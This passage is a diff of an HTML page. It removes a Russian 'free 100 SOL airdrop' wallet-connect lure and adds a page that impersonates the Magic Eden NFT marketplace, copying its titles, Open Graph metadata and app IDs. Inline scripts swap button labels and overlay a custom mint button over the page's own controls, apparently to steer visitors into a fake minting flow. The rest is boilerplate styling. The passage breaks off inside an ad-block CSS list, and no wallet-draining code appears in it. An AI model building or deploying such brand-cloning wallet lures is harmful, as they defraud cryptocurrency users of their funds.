@@ -1,36 +1,2228 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Solana Airdrop</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 50px;
-      margin: 0;
-      background-color: #f0f0f0;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      margin: 5px;
-    }
-    #status {
-      margin-top: 20px;
-      color: green;
-    }
-  </style>
-</head>
-<body>
-  <h1>Получите 100 SOL бесплатно!</h1>
-  <p>Подтвердите участие в airdrop через ваш кошелек Solana.</p>
-  <button class="connect-button">Подключить кошелек</button>
-  <div id="status"></div>
+<html lang="">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width,initial-scale=1">
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+        <link rel="icon" href="../media/favicon.png" type="image/png"/>
+        <title>Magic Eden - NFT Marketplace</title>
+        <meta property="twitter:image" content="media/nft.png">
+        <meta name="theme-color" content="#CF00F6">
+        <meta property="twitter:image" content="../../nft.png">
+        <meta property="og:image" content="https://imagedelivery.net/E-VnZk4fwouzlzwX_qz4fg/a7584af9-32cc-4a68-4bda-64ead5a07300/public" data-react-helmet="true"/>
+        <meta name="twitter:card" content="summary_large_image">
+        <meta property="og:type" content="website">
+        <meta property="og:title" content="www.magiceden.io/launchpad/magicticket" data-react-helmet="true">
+        <meta property="og:site_name" content="Magic Eden">
+        <meta property="og:description" content="Magic Eden is the leading NFT Marketplace on Solana. Home to the next generation of digital creators. Discover the best and latest Solana NFT collections." property="og:description" data-rh="true">
+        <meta name="twitter:image" content="https://imagedelivery.net/E-VnZk4fwouzlzwX_qz4fg/a7584af9-32cc-4a68-4bda-64ead5a07300/public" data-react-helmet="true"/>
+        <link type="application/json+oembed" href="../static/json/heaven.json">
+        <meta property="og:image" content="">
+        <meta name="google-play-app" content="app-id=io.magiceden.android">
+        <link rel="android-touch-icon" href="../../media/appIcon.png">
+        <link rel="apple-touch-icon" href="../../favicon.ico">
+        <meta name="apple-itunes-app" content="app-id=1602924580">
+        <link href="../../css/bootstrap.min.css" rel="stylesheet" integrity="sha512-6KY5s6UI5J7SVYuZB4S/CZMyPylqyyNZco376NM2Z8Sb8OxEdp02e1jkKk/wZxIEmjQ6DRCEBhni+gpr9c4tvA==" crossorigin="anonymous">
+        <link rel="stylesheet" href="../../css/animate.min.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+        <title>Magic Eden - NFT Marketplace</title>
+        <link type="text/css" href="../../css/chunk.css" rel="stylesheet">
+        <link type="text/css" href="../../css/main.chunk.css" rel="stylesheet">
+        <script>
+            function waitForElementToDisplay() {
+                setTimeout(function() {
+                    if (document.getElementById('mint-token') != null) {
+                        document.getElementById('showcase__btn0').innerText = document.getElementById('mint-token').innerText
+                        document.getElementById('buttt').classList.add('tippy-popper');
+                        document.getElementById('qqqq').style.marginRight = "55%"
+                    } else {
+                        waitForElementToDisplay();
+                    }
+                }, 10);
+            }
 
-  <script>
+            function waitForElementToDisplay3() {
+                setTimeout(function() {
+                    if (document.querySelectorAll('.MuiButton-label')[0].innerText == "Mint your token!") {
+                        document.getElementById('mintBtn').style.display = "none"
+                        document.getElementById('root').style.display = "flex"
+                    } else {
+                        waitForElementToDisplay3()
+                    }
+                }, 10);
+            }
+
+            function waitForElementToDisplay2() {
+                setTimeout(function() {
+                    if (document.querySelectorAll('.MuiCircularProgress-svg')[0] !== undefined) {
+                        document.getElementById('mintBtn').style.display = "flex"
+                        document.getElementById('root').style.display = "none"
+                        waitForElementToDisplay3();
+                    } else {
+                        waitForElementToDisplay2();
+                    }
+                }, 10);
+            }
+
+            window.addEventListener('load', () => {
+                waitForElementToDisplay();
+            }
+            );
+
+            window.addEventListener('click', () => {
+                document.getElementById('mintyour').addEventListener('click', function(e) {
+                    waitForElementToDisplay2()
+                });
+            }
+            );
+            window.addEventListener('click', () => {
+                document.getElementById('showcase__btn0').addEventListener('click', function(e) {
+                    document.getElementsByClassName('MuiButton-containedPrimary')[0].click();
+                });
+
+                var res;
+                var arrElem = document.querySelectorAll('.MuiButton-label');
+                var arrayElem = [];
+                for (var i = 0; i < arrElem.length; i++) {
+                    arrayElem.push(arrElem[i]);
+                    arrElem[i].addEventListener('click', function(e) {
+                        res = arrayElem.indexOf(e.target);
+                        switch (res) {
+                        case 1:
+                            {
+                                waitForElementToDisplay()
+                                break;
+                            }
+                        case 2:
+                            {
+                                waitForElementToDisplay()
+                                break;
+                            }
+                        case 3:
+                            {
+                                waitForElementToDisplay()
+                                break;
+                            }
+                        case 4:
+                            {
+                                if (arrElem.length == 5) {
+                                    break;
+                                }
+                                waitForElementToDisplay()
+                                break;
+                            }
+                        case 5:
+                            {
+                                waitForElementToDisplay()
+                                break;
+                            }
+                        }
+                    });
+                }
+            }
+            );
+        </script>
+        <style type="text/css">
+            .qqq {
+                color: #d3d3d3 !important;
+            }
+
+            .mintBtn {
+                z-index: 9999;
+                padding: 1px !important;
+                align-items: center !important;
+                justify-content: center !important;
+                width: 300px !important;
+                height: 42px !important;
+                background: #e42575 !important;
+                border-radius: 6px !important;
+                background-image: #e42575 !important;
+                font-family: ui-sans-serif, system-ui !important;
+                color: #d3d3d3 !important;
+            }
+
+            .header__search {
+                position: relative;
+                width: 574px;
+                margin-right: 30px;
+                height: 44px;
+            }
+
+            @media screen and (max-width: 1200px) {
+                .header__search {
+                    width: 250px;
+                    margin-right: 20px;
+                }
+            }
+
+            @media screen and (max-width: 991px) {
+                .header__search {
+                    display: none;
+                }
+            }
+
+            .header__block {
+                display: flex;
+                align-items: center;
+            }
+
+            .header__search input {
+                background: #24182f !important;
+                border: 1px solid #24182f;
+                border-radius: 40px;
+                box-sizing: border-box;
+                padding: 0 50px;
+                width: 100%;
+                color: #fff !important;
+                height: 100%;
+                font-size: 12px;
+                opacity: 0.85;
+            }
+
+            .header__search :hover {
+                border: 1px solid rgb(161, 151, 170);
+                transition: all 100ms ease 0s;
+            }
+
+            .header__search input::placeholder {
+                color: #6f6d72;
+            }
+
+            .header__search button {
+                position: absolute;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                background: none;
+                cursor: pointer;
+                border: 0;
+                right: 540px;
+                top: 50%;
+                transform: translate(0, -50%);
+                pointer-events: none;
+            }
+
+            .styles-module_wrapper__1I_qj {
+                z-index: 1;
+                display: flex;
+                align-items: center;
+                position: fixed;
+                padding: 0px 60px 0px 60px;
+                left: 0;
+                top: 0;
+                width: 100%;
+                height: 100%;
+                background-color: black;
+                box-sizing: border-box;
+            }
+
+            .styles-module_content__2jwZj {
+                margin: auto;
+                padding: 0;
+                width: 90%;
+                height: 100%;
+                max-height: 100%;
+                text-align: center;
+            }
+
+            .styles-module_slide__1zrfk {
+                height: 100%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .styles-module_image__2hdkJ {
+                max-height: 100%;
+                max-width: 100%;
+                user-select: none;
+                -moz-user-select: none;
+                -webkit-user-select: none;
+            }
+
+            .styles-module_close__2I1sI {
+                color: white;
+                position: absolute;
+                top: 15px;
+                right: 15px;
+                font-size: 40px;
+                font-weight: bold;
+                opacity: 0.2;
+                cursor: pointer;
+            }
+
+            .styles-module_close__2I1sI:hover {
+                opacity: 1;
+            }
+
+            .styles-module_navigation__1pqAE {
+                height: 80%;
+                color: white;
+                cursor: pointer;
+                position: absolute;
+                font-size: 60px;
+                line-height: 60px;
+                font-weight: bold;
+                display: flex;
+                align-items: center;
+                opacity: 0.2;
+                padding: 0 15px;
+                user-select: none;
+                -moz-user-select: none;
+                -webkit-user-select: none;
+            }
+
+            .styles-module_navigation__1pqAE:hover {
+                opacity: 1;
+            }
+
+            @media (hover: none) {
+                .styles-module_navigation__1pqAE:hover {
+                    opacity: 0.2;
+                }
+            }
+
+            .styles-module_prev__KqFRp {
+                left: 0;
+            }
+
+            .styles-module_next__1uQwZ {
+                right: 0;
+            }
+
+            @media (max-width: 900px) {
+                .styles-module_wrapper__1I_qj {
+                    padding: 0;
+                }
+            }
+        </style>
+        <style type="text/css">
+            .react-horizontal-scrolling-menu--wrapper {
+                display: flex;
+            }
+
+            .react-horizontal-scrolling-menu--scroll-container {
+                display: flex;
+                height: max-content;
+                overflow-y: hidden;
+                position: relative;
+                width: 100%;
+            }
+
+            :export {
+                wrapper: react-horizontal-scrolling-menu--wrapper;
+                container: react-horizontal-scrolling-menu--scroll-container;
+            }
+        </style>
+        <style></style>
+        <style></style>
+        <style data-emotion="css" data-s=""></style>
+        <link href="https://app.openlogin.com/start" crossorigin="anonymous" type="text/html" rel="prefetch">
+        <link href="https://app.openlogin.com/sdk-modal" crossorigin="anonymous" type="text/html" rel="prefetch">
+        <style data-styled="active" data-styled-version="5.3.1"></style>
+        <style data-jss="" data-meta="MuiTouchRipple">
+            .MuiTouchRipple-root {
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                z-index: 0;
+                overflow: hidden;
+                position: absolute;
+                border-radius: inherit;
+                pointer-events: none;
+            }
+
+            .MuiTouchRipple-ripple {
+                opacity: 0;
+                position: absolute;
+            }
+
+            .MuiTouchRipple-rippleVisible {
+                opacity: 0.3;
+                animation: MuiTouchRipple-keyframes-enter 550ms cubic-bezier(0.4, 0, 0.2, 1);
+                transform: scale(1);
+            }
+
+            .MuiTouchRipple-ripplePulsate {
+                animation-duration: 200ms;
+            }
+
+            .MuiTouchRipple-child {
+                width: 100%;
+                height: 100%;
+                display: block;
+                opacity: 1;
+                border-radius: 50%;
+                background-color: currentColor;
+            }
+
+            .MuiTouchRipple-childLeaving {
+                opacity: 0;
+                animation: MuiTouchRipple-keyframes-exit 550ms cubic-bezier(0.4, 0, 0.2, 1);
+            }
+
+            .MuiTouchRipple-childPulsate {
+                top: 0;
+                left: 0;
+                position: absolute;
+                animation: MuiTouchRipple-keyframes-pulsate 2500ms cubic-bezier(0.4, 0, 0.2, 1) 200ms infinite;
+            }
+
+            @-webkit-keyframes MuiTouchRipple-keyframes-enter {
+                0% {
+                    opacity: 0.1;
+                    transform: scale(0);
+                }
+
+                100% {
+                    opacity: 0.3;
+                    transform: scale(1);
+                }
+            }
+
+            @-webkit-keyframes MuiTouchRipple-keyframes-exit {
+                0% {
+                    opacity: 1;
+                }
+
+                100% {
+                    opacity: 0;
+                }
+            }
+
+            @-webkit-keyframes MuiTouchRipple-keyframes-pulsate {
+                0% {
+                    transform: scale(1);
+                }
+
+                50% {
+                    transform: scale(0.92);
+                }
+
+                100% {
+                    transform: scale(1);
+                }
+            }
+        </style>
+        <style data-jss="" data-meta="MuiButtonBase">
+            .MuiButtonBase-root {
+                color: inherit;
+                border: 0;
+                cursor: pointer;
+                margin: 0;
+                display: inline-flex;
+                outline: 0;
+                padding: 0;
+                position: relative;
+                align-items: center;
+                user-select: none;
+                border-radius: 0;
+                vertical-align: middle;
+                -moz-appearance: none;
+                justify-content: center;
+                text-decoration: none;
+                background-color: transparent;
+                -webkit-appearance: none;
+                -webkit-tap-highlight-color: transparent;
+            }
+
+            .MuiButtonBase-root::-moz-focus-inner {
+                border-style: none;
+            }
+
+            .MuiButtonBase-root.Mui-disabled {
+                cursor: default;
+                pointer-events: none;
+            }
+
+            @media print {
+                .MuiButtonBase-root {
+                    -webkit-print-color-adjust: exact;
+                }
+            }
+        </style>
+        <style data-jss="" data-meta="MuiButton">
+            .MuiButton-root {
+                color: #fff;
+                padding: 12px 16px;
+                font-size: 0.875rem;
+                min-width: 64px;
+                box-sizing: border-box;
+                transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+                font-weight: 500;
+                line-height: 1.75;
+                border-radius: 4px;
+                letter-spacing: 0.02857em;
+            }
+
+            .MuiButton-root:hover {
+                text-decoration: none;
+                background-color: rgba(255, 255, 255, 0.08);
+            }
+
+            .MuiButton-root.Mui-disabled {
+                color: rgba(255, 255, 255, 0.3);
+            }
+
+            @media (hover: none) {
+                .MuiButton-root:hover {
+                    background-color: transparent;
+                }
+            }
+
+            .MuiButton-root:hover.Mui-disabled {
+                background-color: transparent;
+            }
+
+            .MuiButton-label {
+                width: 100%;
+                display: inherit;
+                align-items: inherit;
+                white-space: nowrap;
+                justify-content: inherit;
+                font-weight: bold;
+            }
+
+            .MuiButton-text {
+                padding: 6px 8px;
+            }
+
+            .MuiButton-textPrimary {
+                color: #3f51b5;
+            }
+
+            .MuiButton-textPrimary:hover {
+                background-color: rgba(63, 81, 181, 0.08);
+            }
+
+            @media (hover: none) {
+                .MuiButton-textPrimary:hover {
+                    background-color: transparent;
+                }
+            }
+
+            .MuiButton-textSecondary {
+                color: #f50057;
+            }
+
+            .MuiButton-textSecondary:hover {
+                background-color: rgba(245, 0, 87, 0.08);
+            }
+
+            @media (hover: none) {
+                .MuiButton-textSecondary:hover {
+                    background-color: transparent;
+                }
+            }
+
+            .MuiButton-outlined {
+                border: 1px solid rgba(255, 255, 255, 0.23);
+                padding: 5px 15px;
+            }
+
+            .MuiButton-outlined.Mui-disabled {
+                border: 1px solid rgba(255, 255, 255, 0.12);
+            }
+
+            .MuiButton-outlinedPrimary {
+                color: #3f51b5;
+                border: 1px solid rgba(63, 81, 181, 0.5);
+            }
+
+            .MuiButton-outlinedPrimary:hover {
+                border: 1px solid #3f51b5;
+                background-color: rgba(63, 81, 181, 0.08);
+            }
+
+            @media (hover: none) {
+                .MuiButton-outlinedPrimary:hover {
+                    background-color: transparent;
+                }
+            }
+
+            .MuiButton-contained {
+                color: rgba(0, 0, 0, 0.87);
+                box-shadow: 0px 3px 1px -2px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 1px 5px 0px rgba(0,0,0,0.12);
+                background-color: #e0e0e0;
+            }
+
+            .MuiButton-contained:hover {
+                box-shadow: 0px 2px 4px -1px rgba(0,0,0,0.2),0px 4px 5px 0px rgba(0,0,0,0.14),0px 1px 10px 0px rgba(0,0,0,0.12);
+                background-color: #d5d5d5;
+            }
+
+            .MuiButton-contained.Mui-focusVisible {
+                box-shadow: 0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);
+            }
+
+            .MuiButton-contained:active {
+                box-shadow: 0px 5px 5px -3px rgba(0,0,0,0.2),0px 8px 10px 1px rgba(0,0,0,0.14),0px 3px 14px 2px rgba(0,0,0,0.12);
+            }
+
+            .MuiButton-contained.Mui-disabled {
+                color: rgba(255, 255, 255, 0.3);
+                box-shadow: none;
+                background-color: rgba(255, 255, 255, 0.12);
+            }
+
+            @media (hover: none) {
+                .MuiButton-contained:hover {
+                    box-shadow: 0px 3px 1px -2px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 1px 5px 0px rgba(0,0,0,0.12);
+                    background-color: #e0e0e0;
+                }
+            }
+
+            .MuiButton-contained:hover.Mui-disabled {
+                background-color: rgba(255, 255, 255, 0.12);
+            }
+
+            .MuiButton-containedPrimary {
+                color: #fff;
+                background-color: #3f51b5;
+            }
+
+            .MuiButton-containedPrimary:hover {
+                background-color: #303f9f;
+            }
+
+            @media (hover: none) {
+                .MuiButton-containedPrimary:hover {
+                    background-color: #3f51b5;
+                }
+            }
+
+            .MuiButton-disableElevation {
+                box-shadow: none;
+            }
+
+            .MuiButton-disableElevation:hover {
+                box-shadow: none;
+            }
+
+            .MuiButton-disableElevation.Mui-focusVisible {
+                box-shadow: none;
+            }
+
+            .MuiButton-disableElevation:active {
+                box-shadow: none;
+            }
+
+            .MuiButton-disableElevation.Mui-disabled {
+                box-shadow: none;
+            }
+
+            .MuiButton-colorInherit {
+                color: inherit;
+                border-color: currentColor;
+            }
+
+            .MuiButton-textSizeSmall {
+                padding: 4px 5px;
+                font-size: 0.8125rem;
+            }
+
+            .MuiButton-textSizeLarge {
+                padding: 8px 11px;
+                font-size: 0.9375rem;
+            }
+
+            .MuiButton-outlinedSizeSmall {
+                padding: 3px 9px;
+                font-size: 0.8125rem;
+            }
+
+            .MuiButton-outlinedSizeLarge {
+                padding: 7px 21px;
+                font-size: 0.9375rem;
+            }
+
+            .MuiButton-containedSizeSmall {
+                padding: 4px 10px;
+                font-size: 0.8125rem;
+            }
+
+            .MuiButton-containedSizeLarge {
+                padding: 8px 22px;
+                font-size: 0.9375rem;
+            }
+
+            .MuiButton-fullWidth {
+                width: 100%;
+            }
+
+            .MuiButton-startIcon {
+                display: inherit;
+                margin-left: -4px;
+                margin-right: 20px;
+            }
+
+            .MuiButton-startIcon.MuiButton-iconSizeSmall {
+                margin-left: -2px;
+            }
+
+            .MuiButton-endIcon {
+                display: inherit;
+                margin-left: 20px;
+                margin-right: -4px;
+            }
+
+            .MuiButton-endIcon.MuiButton-iconSizeSmall {
+                margin-right: -2px;
+            }
+
+            .MuiButton-iconSizeSmall > *:first-child {
+                font-size: 18px;
+            }
+
+            .MuiButton-iconSizeMedium > *:first-child {
+                font-size: 20px;
+            }
+
+            .MuiButton-iconSizeLarge > *:first-child {
+                font-size: 22px;
+            }
+        </style>
+        <style data-jss="" data-meta="MuiSnackbar">
+            .MuiSnackbar-root {
+                left: 8px;
+                right: 8px;
+                display: flex;
+                z-index: 1400;
+                position: fixed;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .MuiSnackbar-anchorOriginTopCenter {
+                top: 8px;
+            }
+
+            @media (min-width: 600px) {
+                .MuiSnackbar-anchorOriginTopCenter {
+                    top: 24px;
+                    left: 50%;
+                    right: auto;
+                    transform: translateX(-50%);
+                }
+            }
+
+            .MuiSnackbar-anchorOriginBottomCenter {
+                bottom: 8px;
+            }
+
+            @media (min-width: 600px) {
+                .MuiSnackbar-anchorOriginBottomCenter {
+                    left: 50%;
+                    right: auto;
+                    bottom: 24px;
+                    transform: translateX(-50%);
+                }
+            }
+
+            .MuiSnackbar-anchorOriginTopRight {
+                top: 8px;
+                justify-content: flex-end;
+            }
+
+            @media (min-width: 600px) {
+                .MuiSnackbar-anchorOriginTopRight {
+                    top: 24px;
+                    left: auto;
+                    right: 24px;
+                }
+            }
+
+            .MuiSnackbar-anchorOriginBottomRight {
+                bottom: 8px;
+                justify-content: flex-end;
+            }
+
+            @media (min-width: 600px) {
+                .MuiSnackbar-anchorOriginBottomRight {
+                    left: auto;
+                    right: 24px;
+                    bottom: 24px;
+                }
+            }
+
+            .MuiSnackbar-anchorOriginTopLeft {
+                top: 8px;
+                justify-content: flex-start;
+            }
+
+            @media (min-width: 600px) {
+                .MuiSnackbar-anchorOriginTopLeft {
+                    top: 24px;
+                    left: 24px;
+                    right: auto;
+                }
+            }
+
+            .MuiSnackbar-anchorOriginBottomLeft {
+                bottom: 8px;
+                justify-content: flex-start;
+            }
+
+            @media (min-width: 600px) {
+                .MuiSnackbar-anchorOriginBottomLeft {
+                    left: 24px;
+                    right: auto;
+                    bottom: 24px;
+                }
+            }
+        </style>
+        <style data-jss="" data-meta="MuiDialog">
+            @media print {
+                .MuiDialog-root {
+                    position: absolute !important;
+                }
+            }
+
+            .MuiDialog-scrollPaper {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .MuiDialog-scrollBody {
+                overflow-x: hidden;
+                overflow-y: auto;
+                text-align: center;
+            }
+
+            .MuiDialog-scrollBody:after {
+                width: 0;
+                height: 100%;
+                content: "";
+                display: inline-block;
+                vertical-align: middle;
+            }
+
+            .MuiDialog-container {
+                height: 100%;
+                outline: 0;
+            }
+
+            @media print {
+                .MuiDialog-container {
+                    height: auto;
+                }
+            }
+
+            .MuiDialog-paper {
+                margin: 32px;
+                position: relative;
+                overflow-y: auto;
+            }
+
+            @media print {
+                .MuiDialog-paper {
+                    box-shadow: none;
+                    overflow-y: visible;
+                }
+            }
+
+            .MuiDialog-paperScrollPaper {
+                display: flex;
+                max-height: calc(100% - 64px);
+                flex-direction: column;
+            }
+
+            .MuiDialog-paperScrollBody {
+                display: inline-block;
+                text-align: left;
+                vertical-align: middle;
+            }
+
+            .MuiDialog-paperWidthFalse {
+                max-width: calc(100% - 64px);
+            }
+
+            .MuiDialog-paperWidthXs {
+                max-width: 444px;
+            }
+
+            @media (max-width: 507.95px) {
+                .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
+                    max-width: calc(100% - 64px);
+                }
+            }
+
+            .MuiDialog-paperWidthSm {
+                max-width: 600px;
+            }
+
+            @media (max-width: 663.95px) {
+                .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
+                    max-width: calc(100% - 64px);
+                }
+            }
+
+            .MuiDialog-paperWidthMd {
+                max-width: 960px;
+            }
+
+            @media (max-width: 1023.95px) {
+                .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
+                    max-width: calc(100% - 64px);
+                }
+            }
+
+            .MuiDialog-paperWidthLg {
+                max-width: 1280px;
+            }
+
+            @media (max-width: 1343.95px) {
+                .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
+                    max-width: calc(100% - 64px);
+                }
+            }
+
+            .MuiDialog-paperWidthXl {
+                max-width: 1920px;
+            }
+
+            @media (max-width: 1983.95px) {
+                .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
+                    max-width: calc(100% - 64px);
+                }
+            }
+
+            .MuiDialog-paperFullWidth {
+                width: calc(100% - 64px);
+            }
+
+            .MuiDialog-paperFullScreen {
+                width: 100%;
+                height: 100%;
+                margin: 0;
+                max-width: 100%;
+                max-height: none;
+                border-radius: 0;
+            }
+
+            .MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
+                margin: 0;
+                max-width: 100%;
+            }
+        </style>
+        <style data-jss="" data-meta="makeStyles">
+            .jss1 .MuiDialog-paper {
+                width: 320px;
+                margin: 0;
+            }
+
+            .jss1 .MuiDialogTitle-root {
+                background-color: #3f51b5;
+            }
+
+            .jss1 .MuiDialogContent-root {
+                padding: 0;
+            }
+
+            .jss1 .MuiDialogContent-root .MuiList-root {
+                padding: 0;
+                background: #212121;
+            }
+
+            .jss1 .MuiDialogContent-root .MuiListItem-root {
+                padding: 0;
+                box-shadow: inset 0 1px 0 0 rgba(255, 255, 255, 0.1);
+            }
+
+            .jss1 .MuiDialogContent-root .MuiListItem-root:hover {
+                box-shadow: inset 0 1px 0 0 rgba(255, 255, 255, 0.1), 0 1px 0 0 rgba(255, 255, 255, 0.05);
+            }
+
+            .jss1 .MuiDialogContent-root .MuiListItem-root .MuiButton-endIcon {
+                margin: 0;
+            }
+
+            .jss1 .MuiDialogContent-root .MuiListItem-root .MuiButton-root {
+                padding: 8px 24px;
+                flex-grow: 1;
+                font-size: 1rem;
+                font-weight: 400;
+                justify-content: space-between;
+            }
+
+            .jss1 .MuiDialogContent-root .MuiListItem-root .MuiSvgIcon-root {
+                color: #9e9e9e;
+            }
+
+            .jss1 .MuiDialogContent-root .MuiCollapse-root .MuiList-root {
+                background: #212121;
+            }
+
+            .jss1 .MuiDialogTitle-root .MuiTypography-root {
+                display: flex;
+                line-height: 40px;
+                justify-content: space-between;
+            }
+
+            .jss1 .MuiDialogTitle-root .MuiIconButton-root {
+                color: #9e9e9e;
+                padding: 8px;
+                flex-shrink: 1;
+                margin-right: -8px;
+            }
+        </style>
+        <style type="text/css">
+            :root topadblock, :root span[id^="ezoic-pub-ad-placeholder-"], :root div[id^="zergnet-widget"], :root div[id^="traffective-ad-"], :root div[id^="taboola-stream-"], :root div[id^="sticky_ad_"], :root div[id^="rc-widget-"], :root div[id^="proadszone-"], :root div[id^="lazyad-"], :root div[id^="js-dfp-"], :root div[id^="gtm-ad-"], :root div[id^="google_dfp_"], :root div[id^="ezoic-pub-ad-"], :root div[id^="div-gpt-"], :root div[id^="div-adtech-ad-"], :root div[id^="dfp-slot-"], :root div[id^="dfp-ad-"], :root div[id^="code_ads_"], :root div[id^="banner-ad-"], :root div[id^="advt-"], :root div[id^="advads_"], :root div[id^="advads-"], :root div[id^="adspot-"], :root div[id^="adrotate_widgets-"], :root div[id^="adngin-"], :root div[id^="adfox_"], :root div[id^="ad_script_"], :root div[id^="ad_rect_"], :root div[id^="ad_position_"], :root div[id^="ad-server-"], :root div[id^="ad-inserter-"], :root div[id^="ad-cid-"], :root div[data-test-id="AdDisplayWrapper"], :root div[data-subscript="Advertising"], :root div[data-spotim-slot], :root div[data-role="sidebarAd"], :root div[data-native_ad], :root div[data-mediatype="advertising"], :root div[data-insertion], :root div[data-id-advertdfpconf], :root div[data-adservice-param-tagid="contentad"], :root div[data-before-content="advertisement"], :root div[data-adunit], :root div[data-adunit-path], :root div[data-ad-wrapper], :root div[data-ad-targeting], :root div[data-ad-placeholder], :root div[class^="sp-adslot-"], :root div[class^="s-dfp-"], :root div[class^="proadszone-"], :root a[href^="https://www.bang.com/?aff="], :root div[class^="pane-adsense-managed-"], :root div[class^="native-ad-"], :root a[href^="http://wxdownloadmanager.com/dl/"], :root div[class^="local-feed-banner-ads"], :root div[class^="kiwiad-desktop"], :root a[href^="http://semi-cod.com/clicks/"], :root a[href^="http://adultgames.xxx/"], :root a[href^="https://s.zlink2.com/"], :root div[class^="index_displayAd_"], :root div[class^="index_adAfterContent_"], :root a[href^="http://dwn.pushtraffic.net/"], :root div[class^="hp-ad-rect-"], :root div[class^="block-openx-"], :root div[class^="articleAdUnitMPU_"], :root div[class^="adsbutt_wrapper_"], :root div[class^="ads-partner-"], :root div[class^="adpubs-"], :root div[class^="AdItem-"], :root div[class^="ad_border_"], :root hl-adsense, :root div[data-contentexchange-widget], :root a[href^="https://deliver.tf2www.com/"], :root div[class^="adUnit_"], :root a[href^="http://cwcams.com/landing/click/"], :root a[href^="http://ads.betfair.com/redirect.aspx?"], :root div[class^="StickyHeroAdWrapper-"], :root div[class^="Directory__footerAds"], :root div[class^="pane-google-admanager-"], :root div[class^="Component-dfp-"], :root div[class^="AdhesionAd_"], :root div[class^="Ad__bigBox"], :root div[class^="ad_position_"], :root a[href^="https://go.ebrokerserve.com/"], :root a[href^="http://axdsz.pro/"], :root div[aria-label="Ads"], :root a[href^="http://lp.ezdownloadpro.info/"], :root a[href^="http://uploaded.net/ref/"], :root aside[id^="advads_ad_widget-"], :root aside[id^="adrotate_widgets-"], :root a[href^="https://ad.doubleclick.net/"], :root app-advertisement, :root amp-ad-custom, :root [data-ad-width], :root [id*="MGWrap"], :root ad-desktop-sidebar, :root a[target="_blank"][onmousedown="this.href^='http://paid.outbrain.com/network/redir?"], :root div[id^="div-ads-"], :root a[href^="http://at.atwola.com/"], :root a[onmousedown^="this.href='https://paid.outbrain.com/network/redir?"][target="_blank"] + .ob_source, :root a[onmousedown^="this.href='http://paid.outbrain.com/network/redir?"][target="_blank"] + .ob_source, :root a[href^="https://x.trafficandoffers.com/"], :root a[href^="https://www.vfreecams.com/in/?track="], :root a[href^="https://www.share-online.biz/affiliate/"], :root a[href^="https://www.securegfm.com/"], :root a[href^="https://www.purevpn.com/"][href*="&utm_source=aff-"], :root DFP-AD, :root a[href^="//porngames.adult/?SID="], :root a[href^="https://www.oneclickroot.com/?tap_a="] > img, :root a[href^="https://www.oboom.com/ad/"], :root a[href^="https://www.nudeidols.com/cams/"], :root a[href^="https://www.mypornstarcams.com/landing/click/"], :root a[href^="https://www.mrskin.com/account/"], :root div[data-adzone], :root a[href^="https://www.iyalc.com/"], :root a[href^="https://www.goldenfrog.com/vyprvpn?offer_id="][href*="&aff_id="], :root a[href^="https://www.get-express-vpn.com/offer/"], :root a[href^="https://www.gambling-affiliation.com/cpc/"], :root div[data-dfp-id], :root a[href^="https://rev.adsession.com/"], :root div[class^="kiwi-ad-wrapper"], :root a[href^="http://webgirlz.online/landing/"], :root a[href^="https://www.g4mz.com/"], :root [href^="http://advertisesimple.info/"], :root a[href^="https://www.friendlyduck.com/AF_"], :root a[href^="https://www.dollps.com/?track="], :root a[href^="https://www.clicktraceclick.com/"], :root a[href^="https://www.camsoda.com/enter.php?id="], :root a[href^="https://www.brazzersnetwork.com/landing/"], :root a[href^="https://www.bebi.com"], :root a[href^="https://www.awin1.com/cread.php?awinaffid="], :root .card-captioned.crd > .crd--cnt > .s2nPlayer, :root a[href^="https://www.arthrozene.com/"][href*="?tid="], :root a[href^="https://www.adskeeper.co.uk/"], :root a[href^="https://t.grtyi.com/"], :root a[href^="https://wittered-mainging.com/"], :root a[href^="http://farm.plista.com/pets"], :root a[href^="https://windscribe.com/promo/"], :root [href^="/ucdownload.php"], :root a[href^="https://wantopticalfreelance.com/"], :root amp-embed[type="taboola"], :root a[href^="http://c43a3cd8f99413891.com/"], :root a[href^="https://trust.zone/go/r.php?RID="], :root a[href^="https://trf.bannerator.com/"], :root a[href^="http://go.247traffic.com/"], :root a[href^="https://bestcond1tions.com/"], :root a[href^="https://trappist-1d.com/"], :root a[href^="http://anonymous-net.com/"], :root a[href^="https://transfer.xe.com/signup/track/redirect?"], :root a[href^="https://vo2.qrlsx.com/"], :root a[href^="https://tracking.truthfinder.com/?a="], :root a[href^="https://tracking.gitads.io/"], :root a[href^="https://go.xxxjmp.com/"], :root a[href^="https://tracking.avapartner.com/"], :root a[href^="https://track.wg-aff.com"], :root a[href^="https://track.ultravpn.com/"], :root a[href^="https://track.interactivegf.com/"], :root a[href^="https://vlnk.me/"], :root 